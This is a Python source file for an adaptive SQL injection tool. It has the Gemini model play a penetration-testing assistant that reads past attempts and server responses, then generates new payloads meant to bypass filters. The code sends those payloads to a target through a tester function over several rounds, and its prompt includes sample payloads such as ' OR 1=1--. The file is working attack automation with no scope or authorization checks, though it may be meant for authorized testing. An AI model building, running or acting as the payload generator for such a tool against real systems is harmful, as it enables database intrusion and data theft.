import os
import json
import sqlparse
from dotenv import load_dotenv
import google.generativeai as genai


class GeminiFeedbackAgent:
    def __init__(self):
        load_dotenv()
        api_key = os.getenv("GEMINI_API_KEY")

        if not api_key:
            raise RuntimeError("GEMINI_API_KEY missing in environment variables")

        genai.configure(api_key=api_key)
        self.model = genai.GenerativeModel("gemini-2.5-flash")
    def is_valid_sql(self, payload: str) -> bool:
        try:
            parsed = sqlparse.parse(payload)
            return len(parsed) > 0
        except Exception:
            return False

    def generate_refined_payloads(self, attempt_response_dict):

        prompt = f"""
        You are an expert penetration testing assistant performing adaptive SQL injection discovery.

        Historical attempts with server responses:

        {json.dumps(attempt_response_dict, indent=2)}

        Your objectives:
        - Infer filtering logic and database behavior
        - Generate NEW refined SQL injection payloads only
        - Focus on bypass techniques and vulnerability confirmation

        Allowed techniques:
        inline comments, encoding, boolean logic, time delays, query restructuring, case tricks

        STRICT OUTPUT:
            Return ONLY a JSON array of SQL injection strings.
        Example:
        [
            "' OR 1=1--",
            "'/**/UNION/**/SELECT/**/NULL,NULL--"
        ]

        No text outside JSON.
        """

        response = self.model.generate_content(prompt)
        raw = response.text.strip()

        start = raw.find("[")
        end = raw.rfind("]") + 1

        if start == -1 or end == -1:
            raise ValueError("LLM did not return JSON list")

        payloads = json.loads(raw[start:end])


        valid_payloads = [
            p for p in payloads if isinstance(p, str) and self.is_valid_sql(p)
        ]

        return valid_payloads

    
    def adaptive_loop(self, tester_func, initial_history=None, max_rounds=2):
        history = initial_history if initial_history is not None else {}

        for round_num in range(1, max_rounds + 1):
            print(f"\n--- AI Round {round_num} ---")
            new_payloads = self.generate_refined_payloads(history)

            if not new_payloads:
                break
            queries_sent_this_round = 0
            for payload in new_payloads:
                if payload in history:
                    continue
                
                if queries_sent_this_round >= 2: 
                    break

                response = tester_func(payload)
                history[payload] = response

                print(f"[AI TRY] Round {round_num}, Query {queries_sent_this_round + 1}: {payload}")
                queries_sent_this_round += 1

        return history